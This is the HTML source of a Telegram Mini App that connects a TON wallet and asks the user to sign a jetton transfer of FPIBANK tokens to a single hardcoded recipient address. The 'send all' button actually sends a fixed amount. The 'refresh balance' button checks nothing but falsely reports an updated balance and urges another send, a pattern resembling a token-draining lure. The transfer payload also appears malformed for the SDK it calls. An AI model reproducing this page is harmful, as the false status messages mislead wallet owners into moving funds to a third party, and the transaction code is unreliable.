<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
    style-src 'self' 'unsafe-inline' https://unpkg.com;
    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
    font-src 'self' https://unpkg.com;
    img-src * data:;
  ">

  <title>Telegram Mini App: TON Connect Jetton Transfer</title>

  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех токенов FPIBANK</h1>

  <div id="ton-connect"></div>

  <button id="sendTransaction">Отправить все FPIBANK</button>
  <button id="refreshBalance">Обновить баланс</button>

  <script>
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg)
        }
      };
    } else {
      Telegram.WebApp.ready();
    }

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";

    async function checkJettonWallet(userAddress, jettonMasterAddress) {
      const response = await fetch(`https://tonapi.io/v2/jettons/${jettonMasterAddress}/wallets/${userAddress}`);
      if (response.status === 404) {
        console.log("Jetton Wallet не найден.");
        return null;
      }
      const data = await response.json();
      return data.address;
    }

    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
      const jettonWalletAddress = await checkJettonWallet(userWalletAddress, jettonMasterAddress);
      if (!jettonWalletAddress) {
        Telegram.WebApp.showAlert("Подождите несколько секунд, Jetton Wallet ещё не создан.");
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: jettonWalletAddress,
            amount: "50000000",
            payload: {
              type: "jetton_transfer",
              query_id: 0,
              amount: "1000000000",
              destination: recipientAddress,
              response_destination: null,
              custom_payload: null,
              forward_ton_amount: "0",
              forward_payload: null
            }
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Попытка отправить Jetton:", result);
        Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
      } catch (error) {
        console.error("Ошибка:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    async function sendAllFPIBANK() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
        return;
      }

      const userWalletAddress = tonConnectUI.wallet.account.address;
      const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
      await sendJettonTransaction(userWalletAddress, recipientAddress);
    }

    async function refreshBalance() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
        return;
      }
      Telegram.WebApp.showAlert("Баланс Jetton обновлен, попробуйте отправку ещё раз.");
    }

    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
    document.getElementById("refreshBalance").addEventListener("click", refreshBalance);
  </script>
</body>
</html>
